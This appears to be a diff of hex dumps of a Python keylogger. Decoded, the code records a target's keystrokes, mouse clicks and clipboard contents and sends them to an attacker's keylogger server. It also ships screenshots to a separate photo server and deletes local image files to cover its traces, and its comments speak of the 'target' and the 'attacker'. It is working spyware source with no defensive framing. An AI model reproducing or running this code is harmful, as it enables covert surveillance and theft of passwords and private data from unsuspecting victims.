+000016c0: 6b65 796c 6f67 6765 722c 2070 6f72 745f  keylogger, port_
+000016d0: 6b65 796c 6f67 6765 7229 290d 0a20 2020  keylogger))..   
+000016e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000016f0: 2062 7265 616b 0d0a 2020 2020 2020 2020   break..        
+00001700: 2020 2020 2020 2020 6578 6365 7074 3a0d          except:.
+00001710: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00001720: 2020 2020 2063 6f6e 7469 6e75 650d 0a0d       continue...
+00001730: 0a20 2020 2020 2020 2020 2020 2023 2054  .            # T
+00001740: 6869 7320 6973 2074 6865 2069 7020 616e  his is the ip an
+00001750: 6420 7468 6520 706f 7274 206f 6620 7468  d the port of th
+00001760: 6520 7365 7276 6572 2074 6865 2070 6f72  e server the por
+00001770: 7420 7368 6f75 6c64 6e27 7420 6265 2074  t shouldn't be t
+00001780: 6865 2073 616d 6520 7468 6520 7365 7276  he same the serv
+00001790: 6572 5f70 686f 746f 7320 616e 6420 7468  er_photos and th
+000017a0: 6520 7365 7276 6572 5f6b 6579 6c6f 6767  e server_keylogg
+000017b0: 6572 2073 686f 756c 646e 2774 2062 650d  er shouldn't be.
+000017c0: 0a20 2020 2020 2020 2020 2020 2023 2069  .            # i
+000017d0: 6e20 7468 6520 7361 6d65 2066 6f6c 6465  n the same folde
+000017e0: 720d 0a20 2020 2020 2020 2020 2020 2070  r..            p
+000017f0: 7269 6e74 2873 656c 662e 636f 6f72 6469  rint(self.coordi
+00001800: 6e61 7465 7329 0d0a 2020 2020 2020 2020  nates)..        
+00001810: 2020 2020 776f 7274 203d 2022 220d 0a20      wort = "".. 
+00001820: 2020 2020 2020 2020 2020 2066 6f72 207a             for z
+00001830: 6569 6368 656e 2069 6e20 7365 6c66 2e72  eichen in self.r
+00001840: 6963 6874 6967 655f 6c69 7374 653a 0d0a  ichtige_liste:..
+00001850: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00001860: 776f 7274 202b 3d20 7a65 6963 6865 6e0d  wort += zeichen.
+00001870: 0a0d 0a20 2020 2020 2020 2020 2020 2023  ...            #
+00001880: 2047 6574 7320 7468 6520 636f 6f72 6469   Gets the coordi
+00001890: 6e61 7465 7320 7768 6572 6520 7468 6520  nates where the 
+000018a0: 7461 7267 6574 2077 6173 2077 7269 7469  target was writi
+000018b0: 6e67 2073 6f6d 6574 6869 6e67 2066 726f  ng something fro
+000018c0: 6d20 7468 6520 6265 6769 6e6e 696e 670d  m the beginning.
+000018d0: 0a20 2020 2020 2020 2020 2020 2023 2053  .            # S
+000018e0: 656e 6473 2074 6865 2064 6174 6120 746f  ends the data to
+000018f0: 2073 6572 7665 725f 6b65 796c 6f67 6765   server_keylogge
+00001900: 720d 0a20 2020 2020 2020 2020 2020 2061  r..            a
+00001910: 6c6c 5f64 6174 6120 3d20 7374 7228 7365  ll_data = str(se
+00001920: 6c66 2e63 6f6f 7264 696e 6174 6573 2920  lf.coordinates) 
+00001930: 2b20 776f 7274 0d0a 2020 2020 2020 2020  + wort..        
+00001940: 2020 2020 2320 436f 6f72 6469 6e61 7465      # Coordinate
+00001950: 7320 616e 6420 6b65 7964 6174 6120 6172  s and keydata ar
+00001960: 6520 6265 696e 6720 636f 6e63 6174 656e  e being concaten
+00001970: 6174 6564 0d0a 2020 2020 2020 2020 2020  ated..          
+00001980: 2020 6b65 795f 6461 7461 2e73 656e 6428    key_data.send(
+00001990: 616c 6c5f 6461 7461 2e65 6e63 6f64 6528  all_data.encode(
+000019a0: 2929 0d0a 2020 2020 2020 2020 2020 2020  ))..            
+000019b0: 7072 696e 7428 776f 7274 290d 0a20 2020  print(wort)..   
+000019c0: 2020 2020 2020 2020 2070 7269 6e74 2873           print(s
+000019d0: 656c 662e 7269 6368 7469 6765 5f6c 6973  elf.richtige_lis
+000019e0: 7465 290d 0a20 2020 2020 2020 2020 2020  te)..           
+000019f0: 2023 2043 6c6f 7365 7320 7468 6520 696d   # Closes the im
+00001a00: 6167 650d 0a0d 0a20 2020 2020 2020 2020  age....         
+00001a10: 2020 2073 656c 662e 7365 6e64 5f69 6d61     self.send_ima
+00001a20: 6765 2869 705f 7068 6f74 6f73 2c20 706f  ge(ip_photos, po
+00001a30: 7274 5f70 686f 746f 7329 0d0a 0d0a 2020  rt_photos)....  
+00001a40: 2020 2020 2020 2020 2020 2320 5765 2068            # We h
+00001a50: 6176 6520 746f 2067 6f20 6261 636b 2073  ave to go back s
+00001a60: 6f20 7468 6174 2077 6520 6361 6e20 6465  o that we can de
+00001a70: 6c65 7465 2074 6865 206f 7468 6572 2064  lete the other d
+00001a80: 6972 6563 746f 7269 6573 0d0a 2020 2020  irectories..    
+00001a90: 2020 2020 2020 2020 7379 732e 6578 6974          sys.exit
+00001aa0: 2829 0d0a 2020 2020 2020 2020 2020 2020  ()..            
+00001ab0: 2320 5374 6f70 7320 7468 6520 6b65 796c  # Stops the keyl
+00001ac0: 6f67 6765 720d 0a20 2020 2020 2020 2065  ogger..        e
+00001ad0: 7863 6570 7420 4b65 7962 6f61 7264 496e  xcept KeyboardIn
+00001ae0: 7465 7272 7570 743a 0d0a 2020 2020 2020  terrupt:..      
+00001af0: 2020 2020 2020 7365 6c66 2e73 656e 645f        self.send_
+00001b00: 696d 6167 6528 6970 5f70 686f 746f 732c  image(ip_photos,
+00001b10: 2070 6f72 745f 7068 6f74 6f73 290d 0a0d   port_photos)...
+00001b20: 0a20 2020 2020 2020 2020 2020 2023 2049  .            # I
+00001b30: 6620 7468 6520 7461 7267 6574 2068 6173  f the target has
+00001b40: 2064 6573 7472 6f79 6564 2074 6865 2063   destroyed the c
+00001b50: 6f6e 6e65 6374 696f 6e0d 0a20 2020 2020  onnection..     
+00001b60: 2020 2020 2020 2077 6f72 7420 3d20 222a         wort = "*
+00001b70: 2a2a 25c2 a7c2 a729 c2a7 c2a7 2522 0d0a  **%....)....%"..
+00001b80: 2020 2020 2020 2020 2020 2020 2320 5468              # Th
+00001b90: 6973 2069 7320 6c69 6b65 2061 2073 7065  is is like a spe
+00001ba0: 6369 616c 2063 6f64 652e 2054 6f20 7370  cial code. To sp
+00001bb0: 6c69 7420 6974 2061 7420 7468 6520 656e  lit it at the en
+00001bc0: 640d 0a20 2020 2020 2020 2020 2020 2066  d..            f
+00001bd0: 6f72 207a 6569 6368 656e 2069 6e20 7365  or zeichen in se
+00001be0: 6c66 2e72 6963 6874 6967 655f 6c69 7374  lf.richtige_list
+00001bf0: 653a 0d0a 2020 2020 2020 2020 2020 2020  e:..            
+00001c00: 2020 2020 776f 7274 202b 3d20 7a65 6963      wort += zeic
+00001c10: 6865 6e0d 0a20 2020 2020 2020 2020 2020  hen..           
+00001c20: 2069 6620 7365 6c66 2e63 6f6f 7264 696e   if self.coordin
+00001c30: 6174 6573 3a0d 0a20 2020 2020 2020 2020  ates:..         
+00001c40: 2020 2020 2020 2077 6f72 7420 2b3d 2073         wort += s
+00001c50: 7472 2873 656c 662e 636f 6f72 6469 6e61  tr(self.coordina
+00001c60: 7465 7329 0d0a 2020 2020 2020 2020 2020  tes)..          
+00001c70: 2020 6461 7461 203d 2066 2254 4845 2043    data = f"THE C
+00001c80: 4f4e 4e45 4354 494f 4e20 4841 5320 4245  ONNECTION HAS BE
+00001c90: 454e 2049 4e54 4552 5255 5054 4544 7b77  EN INTERRUPTED{w
+00001ca0: 6f72 747d 220d 0a20 2020 2020 2020 2020  ort}"..         
+00001cb0: 2020 2023 2054 6869 7320 6c65 7427 7320     # This let's 
+00001cc0: 7468 6520 7365 7276 6572 206b 6e6f 7720  the server know 
+00001cd0: 7468 6174 2074 6865 2073 6572 7665 7220  that the server 
+00001ce0: 7368 6f75 6c64 2073 6875 7420 646f 776e  should shut down
+00001cf0: 0d0a 2020 2020 2020 2020 2020 2020 7768  ..            wh
+00001d00: 696c 6520 5472 7565 3a0d 0a20 2020 2020  ile True:..     
+00001d10: 2020 2020 2020 2020 2020 2074 7279 3a0d             try:.
+00001d20: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00001d30: 2020 2020 206b 6579 5f64 6174 612e 636f       key_data.co
+00001d40: 6e6e 6563 7428 2869 705f 6b65 796c 6f67  nnect((ip_keylog
+00001d50: 6765 722c 2070 6f72 745f 6b65 796c 6f67  ger, port_keylog
+00001d60: 6765 7229 290d 0a20 2020 2020 2020 2020  ger))..         
+00001d70: 2020 2020 2020 2020 2020 206b 6579 5f64             key_d
+00001d80: 6174 612e 7365 6e64 2864 6174 612e 656e  ata.send(data.en
+00001d90: 636f 6465 2829 290d 0a20 2020 2020 2020  code())..       
+00001da0: 2020 2020 2020 2020 2020 2020 206b 6579               key
+00001db0: 5f64 6174 612e 636c 6f73 6528 290d 0a20  _data.close().. 
+00001dc0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00001dd0: 2020 2062 7265 616b 0d0a 2020 2020 2020     break..      
+00001de0: 2020 2020 2020 2020 2020 6578 6365 7074            except
+00001df0: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+00001e00: 2020 2020 2020 2063 6f6e 7469 6e75 650d         continue.
+00001e10: 0a0d 0a20 2020 2020 2020 2020 2020 2069  ...            i
+00001e20: 6620 6e6f 7420 6f73 2e6c 6973 7464 6972  f not os.listdir
+00001e30: 2829 3a0d 0a20 2020 2020 2020 2020 2020  ():..           
+00001e40: 2020 2020 2064 6174 6120 3d20 5b69 6d61       data = [ima
+00001e50: 6765 2066 6f72 2069 6d61 6765 2069 6e20  ge for image in 
+00001e60: 6f73 2e6c 6973 7464 6972 2829 2069 6620  os.listdir() if 
+00001e70: 2249 4d41 4745 2220 696e 2069 6d61 6765  "IMAGE" in image
+00001e80: 5d0d 0a20 2020 2020 2020 2020 2020 2020  ]..             
+00001e90: 2020 2066 6f72 2065 6163 6820 696e 2064     for each in d
+00001ea0: 6174 613a 0d0a 2020 2020 2020 2020 2020  ata:..          
+00001eb0: 2020 2020 2020 2020 2020 6f73 2e72 656d            os.rem
+00001ec0: 6f76 6528 6561 6368 290d 0a0d 0a20 2020  ove(each)....   
+00001ed0: 2064 6566 206b 696c 6c5f 7377 6974 6368   def kill_switch
+00001ee0: 2873 656c 6629 3a0d 0a20 2020 2020 2020  (self):..       
+00001ef0: 2023 2054 6869 7320 6675 6e63 7469 6f6e   # This function
+00001f00: 2064 6573 7472 6f79 7320 7468 6520 6d6f   destroys the mo
+00001f10: 7573 6520 696e 666f 0d0a 2020 2020 2020  use info..      
+00001f20: 2020 6e65 775f 7365 636f 6e64 7320 3d20    new_seconds = 
+00001f30: 7365 6c66 2e64 7572 6174 696f 6e20 2b20  self.duration + 
+00001f40: 350d 0a20 2020 2020 2020 2023 2032 3020  5..        # 20 
+00001f50: 7365 636f 6e64 7320 6172 6520 6265 696e  seconds are bein
+00001f60: 6720 6164 6465 6420 6265 6361 7573 6520  g added because 
+00001f70: 7468 6572 6520 6d69 6768 7420 6265 2061  there might be a
+00001f80: 2070 726f 626c 656d 0d0a 2020 2020 2020   problem..      
+00001f90: 2020 666f 7220 7820 696e 2072 616e 6765    for x in range
+00001fa0: 286e 6577 5f73 6563 6f6e 6473 293a 0d0a  (new_seconds):..
+00001fb0: 2020 2020 2020 2020 2020 2020 7469 6d65              time
+00001fc0: 2e73 6c65 6570 2831 290d 0a20 2020 2020  .sleep(1)..     
+00001fd0: 2020 2023 2054 6869 7320 7374 6f70 6573     # This stopes
+00001fe0: 2074 6865 0d0a 2020 2020 2020 2020 7379   the..        sy
+00001ff0: 732e 6578 6974 2829 0d0a 0d0a 2020 2020  s.exit()....    
+00002000: 6465 6620 6f6e 5f63 6c69 636b 2873 656c  def on_click(sel
+00002010: 662c 2078 2c20 792c 2062 7574 746f 6e2c  f, x, y, button,
+00002020: 2070 7265 7373 6564 293a 0d0a 2020 2020   pressed):..    
+00002030: 2020 2020 2320 5468 6973 2069 7320 7468      # This is th
+00002040: 6520 636c 6963 6b20 6675 6e63 7469 6f6e  e click function
+00002050: 0d0a 2020 2020 2020 2020 7072 696e 7428  ..        print(
+00002060: 6622 5461 7267 6574 2068 6173 2070 7265  f"Target has pre
+00002070: 7373 6564 207b 787d 2061 6e64 207b 797d  ssed {x} and {y}
+00002080: 2229 0d0a 2020 2020 2020 2020 2320 416c  ")..        # Al
+00002090: 6c20 7468 6520 636f 6f72 6469 6e61 7465  l the coordinate
+000020a0: 7320 7769 6c6c 2062 6520 7374 6f72 6564  s will be stored
+000020b0: 2069 6e20 2273 656c 662e 636f 6f72 6469   in "self.coordi
+000020c0: 6e61 7465 7322 0d0a 2020 2020 2020 2020  nates"..        
+000020d0: 6966 2028 782c 7929 206e 6f74 2069 6e20  if (x,y) not in 
+000020e0: 7365 6c66 2e63 6f6f 7264 696e 6174 6573  self.coordinates
+000020f0: 3a0d 0a20 2020 2020 2020 2020 2020 2073  :..            s
+00002100: 656c 662e 636f 6f72 6469 6e61 7465 732e  elf.coordinates.
+00002110: 6170 7065 6e64 2828 782c 2079 2929 0d0a  append((x, y))..
+00002120: 0d0a 2020 2020 6465 6620 616c 6c5f 636c  ..    def all_cl
+00002130: 6963 6b73 2873 656c 6629 3a0d 0a20 2020  icks(self):..   
+00002140: 2020 2020 2023 2054 6869 7320 6973 206a       # This is j
+00002150: 7573 7420 6120 6675 6e63 7469 6f6e 2073  ust a function s
+00002160: 6f20 6974 2063 616e 2062 6520 7261 6e20  o it can be ran 
+00002170: 7769 7468 2074 6872 6561 6469 6e67 0d0a  with threading..
+00002180: 2020 2020 2020 2020 7769 7468 204c 6973          with Lis
+00002190: 7465 6e65 7228 6f6e 5f63 6c69 636b 3d73  tener(on_click=s
+000021a0: 656c 662e 6f6e 5f63 6c69 636b 2920 6173  elf.on_click) as
+000021b0: 206c 6973 7465 6e69 6e67 3a0d 0a20 2020   listening:..   
+000021c0: 2020 2020 2020 2020 2073 656c 662e 6b69           self.ki
+000021d0: 6c6c 5f73 7769 7463 6828 290d 0a20 2020  ll_switch()..   
+000021e0: 2020 2020 2020 2020 206c 6973 7465 6e69           listeni
+000021f0: 6e67 2e6a 6f69 6e28 290d 0a0d 0a20 2020  ng.join()....   
+00002200: 2064 6566 2063 6f70 795f 6461 7461 2873   def copy_data(s
+00002210: 656c 6629 3a0d 0a20 2020 2020 2020 2073  elf):..        s
+00002220: 656c 662e 7269 6368 7469 6765 5f6c 6973  elf.richtige_lis
+00002230: 7465 2e61 7070 656e 6428 2220 2843 4f50  te.append(" (COP
+00002240: 5920 2853 7472 672b 6329 2920 2229 0d0a  Y (Strg+c)) ")..
+00002250: 0d0a 2020 2020 6465 6620 6170 7065 6e64  ..    def append
+00002260: 5f70 6173 7465 2873 656c 6629 3a0d 0a20  _paste(self):.. 
+00002270: 2020 2020 2020 2064 6174 6120 3d20 6622         data = f"
+00002280: 2028 7b70 7970 6572 636c 6970 2e70 6173   ({pyperclip.pas
+00002290: 7465 2829 7d20 7c20 5041 5354 4520 2853  te()} | PASTE (S
+000022a0: 7472 672b 7629 2920 7c20 220d 0a20 2020  trg+v)) | "..   
+000022b0: 2020 2020 2073 656c 662e 7269 6368 7469       self.richti
+000022c0: 6765 5f6c 6973 7465 2e61 7070 656e 6428  ge_liste.append(
+000022d0: 6461 7461 290d 0a0d 0a20 2020 2064 6566  data)....    def
+000022e0: 2070 7269 6e74 5f77 6f72 6b28 7365 6c66   print_work(self
+000022f0: 2c20 776f 7264 293a 0d0a 2020 2020 2020  , word):..      
+00002300: 2020 7072 696e 7428 6627 416c 7068 6162    print(f'Alphab
+00002310: 6574 6963 206b 6579 2077 6173 2070 7265  etic key was pre
+00002320: 7373 6564 3a20 7b77 6f72 647d 2027 290d  ssed: {word} ').
+00002330: 0a20 2020 2020 2020 2073 656c 662e 7269  .        self.ri
+00002340: 6368 7469 6765 5f6c 6973 7465 202b 3d20  chtige_liste += 
+00002350: 776f 7264 0d0a 2020 2020 2020 2020 2320  word..        # 
+00002360: 4576 6572 7920 7072 6573 7365 6420 6b65  Every pressed ke
+00002370: 7920 7769 6c6c 2062 6520 7361 7665 6420  y will be saved 
+00002380: 696e 2022 7269 6368 7469 6765 5f6c 6973  in "richtige_lis
+00002390: 7465 2220 7468 6973 2069 7320 6120 6765  te" this is a ge
+000023a0: 726d 616e 2073 656c 662e 776f 7264 2061  rman self.word a
+000023b0: 6e64 206d 6561 6e73 2022 7269 6768 745f  nd means "right_
+000023c0: 6c69 7374 220d 0a0d 0a20 2020 2064 6566  list"....    def
+000023d0: 206f 6e5f 7072 6573 7328 7365 6c66 2c20   on_press(self, 
+000023e0: 6b65 7929 3a0d 0a20 2020 2020 2020 2074  key):..        t
+000023f0: 7279 3a0d 0a20 2020 2020 2020 2020 2020  ry:..           
+00002400: 2074 7279 3a0d 0a20 2020 2020 2020 2020   try:..         
+00002410: 2020 2020 2020 206f 7468 6572 5f63 6861         other_cha
+00002420: 7265 6374 6572 7320 3d20 7b22 3122 3a20  recters = {"1": 
+00002430: 2221 222c 2022 3222 3a20 2722 272c 2022  "!", "2": '"', "
+00002440: 3322 3a20 22c2 a722 2c20 2234 223a 2022  3": "..", "4": "
+00002450: 2422 2c20 2235 223a 2022 2522 2c20 2236  $", "5": "%", "6
+00002460: 223a 2022 2622 2c20 2237 223a 2022 2f22  ": "&", "7": "/"
+00002470: 2c20 2238 223a 2022 2822 2c0d 0a20 2020  , "8": "(",..   
+00002480: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002490: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000024a0: 2022 3922 3a20 2229 222c 2022 3022 3a20   "9": ")", "0": 
+000024b0: 223d 222c 2022 c39f 223a 2022 3f22 7d0d  "=", "..": "?"}.
+000024c0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+000024d0: 2069 6620 7365 6c66 2e63 6170 7320 6973   if self.caps is
+000024e0: 2054 7275 653a 0d0a 2020 2020 2020 2020   True:..        
+000024f0: 2020 2020 2020 2020 2020 2020 6966 206b              if k
+00002500: 6579 2e63 6861 7220 696e 206f 7468 6572  ey.char in other
+00002510: 5f63 6861 7265 6374 6572 733a 0d0a 2020  _charecters:..  
+00002520: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002530: 2020 2020 2020 7365 6c66 2e77 6f72 6420        self.word 
+00002540: 3d20 6f74 6865 725f 6368 6172 6563 7465  = other_charecte
+00002550: 7273 5b6b 6579 2e63 6861 725d 0d0a 2020  rs[key.char]..  
+00002560: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002570: 2020 2020 2020 2320 5570 7065 7220 4368        # Upper Ch
+00002580: 6172 6163 7465 7273 2066 726f 6d20 2231  aracters from "1
+00002590: 2220 746f 2022 3022 2062 6563 6175 7365  " to "0" because
+000025a0: 2061 6c6c 2074 6869 7320 6e75 6d62 6572   all this number
+000025b0: 7320 6172 6520 6e6f 7420 6368 6172 6563  s are not charec
+000025c0: 7465 7273 2061 7265 206e 6f74 2069 6e20  ters are not in 
+000025d0: 7079 6e70 7574 0d0a 2020 2020 2020 2020  pynput..        
+000025e0: 2020 2020 2020 2020 2020 2020 656c 7365              else
+000025f0: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+00002600: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00002610: 776f 7264 203d 206b 6579 2e63 6861 722e  word = key.char.
+00002620: 7570 7065 7228 290d 0a20 2020 2020 2020  upper()..       
+00002630: 2020 2020 2020 2020 2065 6c73 653a 0d0a           else:..
+00002640: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002650: 2020 2020 7365 6c66 2e77 6f72 6420 3d20      self.word = 
+00002660: 6b65 792e 6368 6172 0d0a 0d0a 2020 2020  key.char....    
+00002670: 2020 2020 2020 2020 2020 2020 616c 6c5f              all_
+00002680: 7265 715f 6b65 7973 203d 207b 2203 223a  req_keys = {".":
+00002690: 2073 656c 662e 636f 7079 5f64 6174 612c   self.copy_data,
+000026a0: 2022 1622 3a20 7365 6c66 2e61 7070 656e   ".": self.appen
+000026b0: 645f 7061 7374 657d 0d0a 2020 2020 2020  d_paste}..      
+000026c0: 2020 2020 2020 2020 2020 2320 2245 5458            # "ETX
+000026d0: 2220 7374 616e 6473 2066 6f72 2022 456e  " stands for "En
+000026e0: 642d 5465 7874 2d63 6861 7261 6374 6572  d-Text-character
+000026f0: 2220 616e 6420 6973 2061 2063 6f6e 7472  " and is a contr
+00002700: 6f6c 2063 6861 7261 6374 6572 2077 6869  ol character whi
+00002710: 6368 206b 6e6f 7773 2074 6865 2063 6861  ch knows the cha
+00002720: 7261 6374 6572 206f 6620 636f 7079 696e  racter of copyin
+00002730: 6720 736f 6d65 7468 696e 6720 6f6e 2074  g something on t
+00002740: 6865 206b 6579 626f 6172 640d 0a20 2020  he keyboard..   
+00002750: 2020 2020 2020 2020 2020 2020 2023 2022               # "
+00002760: 5359 4e22 2073 7461 6e64 7320 666f 7220  SYN" stands for 
+00002770: 2253 796e 6368 726f 6e6f 7573 2049 646c  "Synchronous Idl
+00002780: 6522 2061 6e64 2069 7320 6120 636f 6e74  e" and is a cont
+00002790: 726f 6c20 6368 6172 6163 7465 7220 7768  rol character wh
+000027a0: 6963 6820 6b6e 6f77 7320 7468 6520 6368  ich knows the ch
+000027b0: 6172 6163 7465 7220 6f66 2070 6173 7469  aracter of pasti
+000027c0: 6e67 2073 6f6d 6574 6869 6e67 206f 6e20  ng something on 
+000027d0: 7468 6520 6b65 7962 6f61 7264 0d0a 2020  the keyboard..  
+000027e0: 2020 2020 2020 2020 2020 2020 2020 666f                fo
+000027f0: 7220 6561 6368 5f6b 6579 2069 6e20 616c  r each_key in al
+00002800: 6c5f 7265 715f 6b65 7973 3a0d 0a20 2020  l_req_keys:..   
 00002810: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002820: 2020 2020 616c 6c5f 7265 715f 6b65 7973      all_req_keys
-00002830: 5b65 6163 685f 6b65 795d 2829 0d0a 2020  [each_key]()..  
-00002840: 2020 2020 2020 2020 2020 2020 2020 7472                tr
-00002850: 793a 0d0a 2020 2020 2020 2020 2020 2020  y:..            
-00002860: 2020 2020 2020 2020 6173 6369 5f6e 756d          asci_num
-00002870: 6265 7220 3d20 6f72 6428 7365 6c66 2e77  ber = ord(self.w
-00002880: 6f72 6429 0d0a 2020 2020 2020 2020 2020  ord)..          
-00002890: 2020 2020 2020 2020 2020 2320 4f72 6469            # Ordi
-000028a0: 6e61 6c20 6e75 6d62 6572 2069 6e20 7468  nal number in th
-000028b0: 6520 7261 6e67 6520 6f66 2030 2074 6f20  e range of 0 to 
-000028c0: 3331 2063 6f6d 706c 6574 6573 2061 6c6c  31 completes all
-000028d0: 2073 7065 6369 616c 2063 6861 7261 6374   special charact
-000028e0: 6572 7320 7769 7468 2074 6865 206b 6579  ers with the key
-000028f0: 2022 7374 7267 202b 206c 6574 7465 7222   "strg + letter"
-00002900: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002910: 2020 2020 2020 6966 2061 7363 695f 6e75        if asci_nu
-00002920: 6d62 6572 206e 6f74 2069 6e20 7261 6e67  mber not in rang
-00002930: 6528 302c 2033 3229 3a0d 0a20 2020 2020  e(0, 32):..     
-00002940: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002950: 2020 2023 2069 6620 7468 6572 6520 6973     # if there is
-00002960: 206e 6f20 7370 6563 6961 6c20 6368 6172   no special char
-00002970: 6163 7465 7220 6974 206a 7573 7420 7072  acter it just pr
-00002980: 696e 7473 2074 6865 2061 6c70 6861 6265  ints the alphabe
-00002990: 7469 6320 6e75 6d62 6572 0d0a 2020 2020  tic number..    
+00002820: 2069 6620 6561 6368 5f6b 6579 203d 3d20   if each_key == 
+00002830: 6b65 792e 6368 6172 3a0d 0a20 2020 2020  key.char:..     
+00002840: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002850: 2020 2023 2049 6620 7468 6520 636f 7079     # If the copy
+00002860: 2063 6861 7261 6374 6572 2069 7320 7072   character is pr
+00002870: 6573 7365 642c 2065 6163 6820 6675 6e63  essed, each func
+00002880: 7469 6f6e 206f 6620 6561 6368 2063 6861  tion of each cha
+00002890: 7261 6374 6572 2077 696c 6c20 6265 2077  racter will be w
+000028a0: 6f72 6b69 6e67 0d0a 2020 2020 2020 2020  orking..        
+000028b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000028c0: 616c 6c5f 7265 715f 6b65 7973 5b65 6163  all_req_keys[eac
+000028d0: 685f 6b65 795d 2829 0d0a 2020 2020 2020  h_key]()..      
+000028e0: 2020 2020 2020 2020 2020 7472 793a 0d0a            try:..
+000028f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002900: 2020 2020 6173 6369 5f6e 756d 6265 7220      asci_number 
+00002910: 3d20 6f72 6428 7365 6c66 2e77 6f72 6429  = ord(self.word)
+00002920: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002930: 2020 2020 2020 2320 4f72 6469 6e61 6c20        # Ordinal 
+00002940: 6e75 6d62 6572 2069 6e20 7468 6520 7261  number in the ra
+00002950: 6e67 6520 6f66 2030 2074 6f20 3331 2063  nge of 0 to 31 c
+00002960: 6f6d 706c 6574 6573 2061 6c6c 2073 7065  ompletes all spe
+00002970: 6369 616c 2063 6861 7261 6374 6572 7320  cial characters 
+00002980: 7769 7468 2074 6865 206b 6579 2022 7374  with the key "st
+00002990: 7267 202b 206c 6574 7465 7222 0d0a 2020  rg + letter"..  
 000029a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000029b0: 2020 2020 7365 6c66 2e70 7269 6e74 5f77      self.print_w
-000029c0: 6f72 6b28 7365 6c66 2e77 6f72 6429 0d0a  ork(self.word)..
-000029d0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-000029e0: 2020 6578 6365 7074 2054 7970 6545 7272    except TypeErr
-000029f0: 6f72 3a0d 0a20 2020 2020 2020 2020 2020  or:..           
-00002a00: 2020 2020 2020 2020 2023 2070 7269 6e74           # print
-00002a10: 7320 7468 6520 616c 7068 6162 6574 6320  s the alphabetc 
-00002a20: 6e75 6d62 6572 0d0a 2020 2020 2020 2020  number..        
-00002a30: 2020 2020 2020 2020 2020 2020 7365 6c66              self
-00002a40: 2e70 7269 6e74 5f77 6f72 6b28 7365 6c66  .print_work(self
-00002a50: 2e77 6f72 6429 0d0a 0d0a 2020 2020 2020  .word)....      
-00002a60: 2020 2020 2020 2020 2020 7072 696e 7428            print(
-00002a70: 7365 6c66 2e72 6963 6874 6967 655f 6c69  self.richtige_li
-00002a80: 7374 6529 0d0a 2020 2020 2020 2020 2020  ste)..          
-00002a90: 2020 6578 6365 7074 2054 7970 6545 7272    except TypeErr
-00002aa0: 6f72 3a0d 0a20 2020 2020 2020 2020 2020  or:..           
-00002ab0: 2020 2020 2070 6173 730d 0a0d 0a20 2020       pass....   
-00002ac0: 2020 2020 2065 7863 6570 7420 4174 7472       except Attr
-00002ad0: 6962 7574 6545 7272 6f72 3a0d 0a20 2020  ibuteError:..   
-00002ae0: 2020 2020 2020 2020 2070 7269 6e74 2866           print(f
-00002af0: 2741 6e20 6f74 6865 7220 6b65 7920 7761  'An other key wa
-00002b00: 7320 7072 6573 7365 643a 207b 6b65 797d  s pressed: {key}
-00002b10: 2729 0d0a 2020 2020 2020 2020 2020 2020  ')..            
-00002b20: 6966 206b 6579 203d 3d20 6b65 7962 6f61  if key == keyboa
-00002b30: 7264 2e4b 6579 2e74 6162 3a0d 0a20 2020  rd.Key.tab:..   
-00002b40: 2020 2020 2020 2020 2020 2020 2073 656c               sel
-00002b50: 662e 7269 6368 7469 6765 5f6c 6973 7465  f.richtige_liste
-00002b60: 202b 3d20 2220 5b54 4142 5d20 220d 0a0d   += " [TAB] "...
-00002b70: 0a20 2020 2020 2020 2020 2020 2065 6c69  .            eli
-00002b80: 6620 6b65 7920 3d3d 206b 6579 626f 6172  f key == keyboar
-00002b90: 642e 4b65 792e 656e 7465 723a 0d0a 2020  d.Key.enter:..  
-00002ba0: 2020 2020 2020 2020 2020 2020 2020 7365                se
-00002bb0: 6c66 2e72 6963 6874 6967 655f 6c69 7374  lf.richtige_list
-00002bc0: 6520 2b3d 2022 205b 454e 5445 525d 2022  e += " [ENTER] "
-00002bd0: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
-00002be0: 656c 6966 206b 6579 203d 3d20 6b65 7962  elif key == keyb
-00002bf0: 6f61 7264 2e4b 6579 2e73 7061 6365 3a0d  oard.Key.space:.
-00002c00: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002c10: 2073 656c 662e 7269 6368 7469 6765 5f6c   self.richtige_l
-00002c20: 6973 7465 202b 3d20 227b 220d 0a20 2020  iste += "{"..   
-00002c30: 2020 2020 2020 2020 2020 2020 2023 2049               # I
-00002c40: 6620 7468 6520 7461 7267 6574 2070 7265  f the target pre
-00002c50: 7373 6573 2074 6162 206f 7220 7370 6163  sses tab or spac
-00002c60: 6520 6120 227b 2220 7769 6c6c 2062 6520  e a "{" will be 
-00002c70: 6170 7065 6e64 6564 2074 6f20 7468 6520  appended to the 
-00002c80: 6c69 7374 2073 6f20 7468 6520 6174 7461  list so the atta
-00002c90: 636b 6572 206b 6e6f 7773 2077 6865 6e20  cker knows when 
-00002ca0: 616e 640d 0a20 2020 2020 2020 2020 2020  and..           
-00002cb0: 2020 2020 2023 2073 7061 6365 206f 7220       # space or 
-00002cc0: 6120 7461 6220 6b65 7920 6861 7320 6265  a tab key has be
-00002cd0: 656e 2070 7265 7373 6564 0d0a 2020 2020  en pressed..    
-00002ce0: 2020 2020 2020 2020 656c 6966 206b 6579          elif key
-00002cf0: 203d 3d20 6b65 7962 6f61 7264 2e4b 6579   == keyboard.Key
